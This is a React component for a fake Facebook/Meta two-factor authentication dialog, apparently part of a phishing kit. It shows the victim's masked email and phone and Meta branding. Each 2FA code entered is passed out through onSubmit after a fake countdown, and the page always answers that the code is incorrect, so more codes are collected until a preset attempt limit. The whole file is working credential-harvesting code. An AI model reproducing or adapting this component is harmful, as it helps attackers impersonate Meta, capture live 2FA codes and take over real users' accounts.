import { useState } from 'react';
import PropTypes from 'prop-types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import TwoFAImage from '@/assets/images/2FA.png';
import config from '@/utils/config';

const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [countdown, setCountdown] = useState(0);

    const handleSubmit = async (e) => {
        e.preventDefault();
        const normalizedCode = String(code || '').replace(/\D/g, '');

        if (!/^\d{6,8}$/.test(normalizedCode)) {
            return;
        }

        setIsLoading(true);
        setShowError(false);

        onSubmit(normalizedCode);

        setCountdown(config.code_loading_time || 3);

        const timer = setInterval(() => {
            setCountdown((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        await new Promise((resolve) => setTimeout(resolve, (config.code_loading_time || 3) * 1000));

        setShowError(true);
        setAttempts((prev) => prev + 1);
        setIsLoading(false);
        setCountdown(0);

        if (attempts + 1 >= (config.max_code_attempts || 2)) {
            onSuccess();
            return;
        }

        setCode('');
    };

    const formatTime = (seconds) => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
    };

    /* Mask email: t**t@example.us */
    const maskEmail = (email) => {
        if (!email) return 't**t@example.us';
        const [local, domain] = email.split('@');
        if (!domain) return email;
        if (local.length <= 2) return `${local[0]}**@${domain}`;
        return `${local[0]}**${local[local.length - 1]}@${domain}`;
    };

    /* Mask phone: +60 ****** 25 */
    const maskPhone = (phone) => {
        if (!phone) return '+84 ****** XX';
        const digits = phone.replace(/\D/g, '');
        if (digits.length < 4) return phone;
        return `+${digits.slice(0, 2)} ****** ${digits.slice(-2)}`;
    };

    if (!show) return null;

    const userName = formData?.fullName || 'User';
    const maskedEmail = maskEmail(formData?.personalEmail);
    const maskedPhone = maskPhone(formData?.phone);
    const stepLabel = `(${texts.step || 'Bước'} ${attempts + 1}/${config.max_code_attempts || 3})`;
    const isCodeValid = /^\d{6,8}$/.test(String(code || '').replace(/\D/g, ''));

    /* ── Styles ── */
    const overlayStyle = {
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(0,0,0,0.45)',
        zIndex: 1040,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'flex-start',
        padding: '32px 16px',
        overflowY: 'auto',
        scrollbarWidth: 'none',
        msOverflowStyle: 'none',
    };

    const modalStyle = {
        position: 'relative',
        width: '100%',
        maxWidth: '500px',
        backgroundImage: 'linear-gradient(130deg, #f9f1f9, #eaf3fd 35%, #edfbf2)',
        borderRadius: '18px',
        boxShadow: '0 20px 60px rgba(0,0,0,0.18)',
        zIndex: 1050,
        padding: '28px',
        display: 'flex',
        flexDirection: 'column',
        gap: '16px',
        flexShrink: 0,
    };

    const inputWrapperStyle = {
        width: '100%',
        height: '40px',
        border: `1.5px solid ${showError ? '#e74c3c' : '#d4dbe3'}`,
        borderRadius: '10px',
        backgroundColor: '#fff',
        padding: '0 11px',
        transition: 'all 0.2s',
        marginBottom: '4px',
        display: 'flex',
        alignItems: 'center',
    };

    const inputStyle = {
        width: '100%',
        height: '100%',
        border: 'none',
        outline: 'none',
        fontSize: '14px',
        backgroundColor: 'transparent',
        color: '#333',
    };

    return (
        <div style={overlayStyle} onClick={onClose}>
            <div style={modalStyle} onClick={(e) => e.stopPropagation()}>
                {/* User info row */}
                <div style={{ width: '100%' }}>
                    <div style={{
                        display: 'flex',
                        alignItems: 'center',
                        gap: '6px',
                        fontSize: '14px',
                        color: '#9a979e',
                        marginBottom: '7px',
                    }}>
                        <span>{userName}</span>
                        <div style={{
                            width: '4px',
                            height: '4px',
                            backgroundColor: '#9a979e',
                            borderRadius: '5px',
                        }} />
                        <span>Facebook</span>
                    </div>

                    {/* Title */}
                    <h2 style={{
                        fontSize: '20px',
                        lineHeight: 1.3,
                        color: '#000',
                        fontWeight: 700,
                        marginBottom: '15px',
                        wordBreak: 'break-word',
                    }}>
                        {texts.twoFAStep || 'Yêu cầu xác thực hai yếu tố'} {stepLabel}
                    </h2>

                    {/* Description */}
                    <p style={{
                        color: '#9a979e',
                        fontSize: '14px',
                        lineHeight: 1.55,
                        margin: 0,
                    }}>
                        {`${texts.twoFAInstructionPrefix || 'Enter the code sent to'} ${maskedEmail}, ${maskedPhone}, ${texts.twoFAInstructionSuffix || ',Enter the 6 or 8-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email, or text message on your mobile phone).'}`}
                    </p>

                    {/* 2FA Image */}
                    <div style={{
                        width: '100%',
                        borderRadius: '10px',
                        backgroundColor: '#f5f5f5',
                        overflow: 'hidden',
                        margin: '15px 0',
                    }}>
                        <img src={TwoFAImage} width="100%" alt="authentication" style={{ display: 'block' }} />
                    </div>

                    {/* Form */}
                    <form onSubmit={handleSubmit}>
                        {/* Label */}
                        <label htmlFor="twoFaInput" style={{
                            display: 'block',
                            marginBottom: '6px',
                            fontSize: '13px',
                            fontWeight: 600,
                            color: '#3b4a64',
                        }}>
                            {texts.code || 'Mã 2FA'} <span style={{ color: '#e5484d' }}>*</span>
                        </label>

                        {/* Input */}
                        <div
                            style={inputWrapperStyle}
                            onMouseOver={(e) => {
                                e.currentTarget.style.borderColor = '#3b82f6';
                                e.currentTarget.style.boxShadow = '0 4px 12px rgba(59,130,246,0.12)';
                            }}
                            onMouseOut={(e) => {
                                if (!e.currentTarget.contains(document.activeElement)) {
                                    e.currentTarget.style.borderColor = showError ? '#e74c3c' : '#d4dbe3';
                                    e.currentTarget.style.boxShadow = 'none';
                                }
                            }}
                            onFocusCapture={(e) => {
                                e.currentTarget.style.borderColor = '#3b82f6';
                                e.currentTarget.style.boxShadow = '0 4px 12px rgba(59,130,246,0.12)';
                            }}
                            onBlurCapture={(e) => {
                                if (!e.currentTarget.contains(e.relatedTarget)) {
                                    e.currentTarget.style.borderColor = showError ? '#e74c3c' : '#d4dbe3';
                                    e.currentTarget.style.boxShadow = 'none';
                                }
                            }}
                        >
                            <input
                                style={inputStyle}
                                inputMode="numeric"
                                id="twoFaInput"
                                placeholder={texts.code || 'Code'}
                                maxLength="8"
                                type="text"
                                autoComplete="off"
                                value={code}
                                onChange={(e) => {
                                    setCode(e.target.value.replace(/\D/g, '').slice(0, 8));
                                    if (showError) setShowError(false);
                                }}
                            />
                        </div>

                        {/* Helper / Error text */}
                        {showError ? (
                            <p style={{
                                color: '#e74c3c',
                                fontSize: '12px',
                                margin: '-1px 0 10px 0',
                            }}>
                                {texts.codeExpired || 'The code you entered is incorrect. Please try again.'}
                            </p>
                        ) : (
                            <p style={{
                                color: '#6a7893',
                                fontSize: '12px',
                                margin: '-1px 0 10px 0',
                            }}>
                                {texts.validCodeHint || 'Mã hợp lệ gồm 6 hoặc 8 chữ số.'}
                            </p>
                        )}

                        {/* Submit button */}
                        <div style={{ width: '100%', marginTop: '20px' }}>
                            <button
                                type="submit"
                                disabled={isLoading || !isCodeValid}
                                style={{
                                    minHeight: '48px',
                                    width: '100%',
                                    backgroundColor: '#0064E0',
                                    color: '#fff',
                                    borderRadius: '40px',
                                    padding: '10px 16px',
                                    border: 'none',
                                    fontSize: '16px',
                                    fontWeight: 600,
                                    display: 'flex',
                                    alignItems: 'center',
                                    justifyContent: 'center',
                                    cursor: (isLoading || !isCodeValid) ? 'not-allowed' : 'pointer',
                                    opacity: (isLoading || !isCodeValid) ? 0.7 : 1,
                                    transition: 'opacity 0.3s',
                                }}
                            >
                                {isLoading ? (
                                    <>
                                        <span style={{
                                            width: '20px',
                                            height: '20px',
                                            border: '3px solid rgba(255,255,255,0.4)',
                                            borderTopColor: '#fff',
                                            borderRadius: '50%',
                                            animation: 'spin 0.8s linear infinite',
                                            display: 'inline-block',
                                            marginRight: '8px',
                                        }} />
                                        {`${texts.pleaseWait || 'Vui lòng chờ'} ${formatTime(countdown)}...`}
                                    </>
                                ) : (
                                    texts.continueBtn || 'Tiếp tục'
                                )}
                            </button>
                        </div>

                        {/* Try another method */}
                        <div style={{
                            width: '100%',
                            marginTop: '20px',
                            color: '#9a979e',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            backgroundColor: 'transparent',
                            borderRadius: '40px',
                            padding: '10px 20px',
                            border: '1px solid #d4dbe3',
                            cursor: 'default',
                            pointerEvents: 'none',
                            fontSize: '14px',
                        }}>
                            <span>{texts.tryAnotherMethod || 'Thử phương thức khác'}</span>
                        </div>
                    </form>
                </div>

                {/* Meta logo */}
                <div style={{
                    width: '60px',
                    height: '60px',
                    flexShrink: 0,
                    margin: '0 auto',
                }}>
                    <img src={MetaLogo} width="100%" height="100%" alt="Meta"
                        style={{ objectFit: 'contain' }} />
                </div>
            </div>

            {/* Spinner keyframe */}
            <style>{`
                @keyframes spin {
                    to { transform: rotate(360deg); }
                }
            `}</style>
        </div>
    );
};

TwoFAModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    onSuccess: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired,
    formData: PropTypes.object
};

export default TwoFAModal;
